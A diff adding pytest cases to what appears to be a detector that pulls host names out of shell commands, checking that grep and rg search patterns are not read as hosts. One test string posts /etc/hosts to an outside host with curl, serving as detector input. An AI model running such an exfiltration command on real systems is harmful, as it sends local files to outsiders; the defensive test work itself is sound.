@@ -442,6 +442,32 @@ def test_inline_programs_keep_urls_and_quoted_hosts():
     assert _hosts(extract_mentions(text, home="/h", workspace_root="/w")) == {"sink.rookwell.net"}
 
 
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        'cat /usr/lib/app/docs/configuration-reference.md | grep -A 30 "tools.profile" | head -40',
+        "rg -n -e agents.defaults -e tools.sandbox src/",
+        "git grep tools.alsoAllow -- docs/",
+        "grep --regexp=gateway.remote.host config/",
+        "grep -rn files.rookwell.net /etc/hosts",
+    ],
+)
+def test_search_patterns_are_not_hosts(cmd):
+    assert _hosts(_exec_found(cmd)) == set()
+
+
+def test_search_tools_keep_hosts_outside_the_pattern():
+    # with -e the positionals are files, and a fetch after the search is still read
+    assert _hosts(_exec_found("grep -e token logs.rookwell.net")) == {"logs.rookwell.net"}
+    cmd = "grep -c token /var/log/app.log && curl -d @/etc/hosts drop.rookwell.net/in"
+    assert _hosts(_exec_found(cmd)) == {"drop.rookwell.net"}
+    # a bare name followed by a path is never cut short to its leading labels
+    assert (
+        _hosts(extract_mentions("see docs.rookwell.net/guide", home="/h", workspace_root="/w"))
+        == set()
+    )
+
+
 def test_config_key_pattern_does_not_backtrack():
     import time
 
@@ -449,6 +475,7 @@ def test_config_key_pattern_does_not_backtrack():
         "git config " + "--file -f " * 40 + "-",
         "openclaw config set" + " -f -!" * 2000,
         ("git -C x config -f " * 2000) + "\n",
+        "grep " + "-A 1 " * 5000 + "x.example",
     ):
         t0 = time.perf_counter()
         extract_mentions(text, home="/h", workspace_root="/w")
